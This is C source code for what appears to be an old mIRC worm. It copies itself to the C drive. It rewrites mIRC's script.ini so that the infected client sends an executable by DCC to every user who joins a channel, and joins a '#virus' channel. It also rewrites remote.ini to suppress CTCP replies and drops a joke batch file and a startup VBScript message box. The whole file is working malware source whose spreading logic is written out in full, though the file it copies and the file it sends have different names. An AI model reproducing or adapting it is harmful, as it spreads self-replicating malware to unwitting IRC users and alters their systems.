#include <stdio.h>
#include <string.h>

short WormCopy(char SRCFileName[], char DSTFileName[])
{
	FILE *SRC, *DST;
	char Buffer[1024];
	short Counter = 0;
	short Status = 0;
	SRC = fopen(SRCFileName, "rb");
	if(SRC)
	{
		DST = fopen(DSTFileName, "wb");
		if(DST)
		{
			while(! feof(SRC))
			{
				Counter = fread(Buffer, 1, 1024, SRC);
				if(Counter)
				fwrite(Buffer, 1, Counter, DST);
			}
		Status = 1;
		}
	}
	fclose(SRC);
	fclose(DST);
	return Status;
}


void main(int argc, char **argv)
{

	FILE *gold;

	char ProgName[100];
	strcpy(ProgName, argv[0]);
	WormCopy(ProgName, "c:\\iaatpb.exe");

	gold = fopen("c:\\mirc\\script.ini","wt");
	if(gold)
	{
		fprintf(gold,"[script]\nn0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }\nn1=/dcc send $nick");
    	fprintf(gold," c:/GOLD.exe\nn2=}\n");
		fprintf(gold,"n3=ON 1:CONNECT:/join #virus | /timer5 1 2 /msg #virus pop | /timer4 1 5 /part #virus");
	}
   	fclose(gold);

	gold = fopen("c:\\mirc\\remote.ini","wt");
	if(gold)
	{
		fprintf(gold,"[remote]\nn0=ctcp ^1:*:?:$1- | halt");
	}
	fclose(gold);

	gold = fopen("c:\\windows\\winbakup.bat","wt");
	if(gold)
	{
		fprintf(gold,"@cls\n");
		fprintf(gold,"@echo It's all about the Pentiums!\n");
		fprintf(gold,"@echo ------------------------------\n");
		fprintf(gold,"@echo My digital media is write-protected.\n");
		fprintf(gold,"@echo Every file inspected, no viruses detected.\n");
		fprintf(gold,"@echo I beta tested every operating system.\n");
		fprintf(gold,"@echo Gave props to some, and others? I dissed 'em.\n");
		fprintf(gold,"@echo While your computer's crashin', mine's multitaskin'..\n");
		fprintf(gold,"@echo It does all my work without me even askin'.\n");
		fprintf(gold,"@echo ------------------------------\n");
		fprintf(gold,"@echo Retro :: http://retro.host.sk \n");
	}
	fclose(gold);

	gold = fopen("c:\\windows\\STARTM~1\\programs\\startup\\iaatpb.vbs","wt");
	if(gold)
	{
		fprintf(gold,"msgbox %c It's all about the Pentiums, Baby! %c", 34, 34);
	}
}



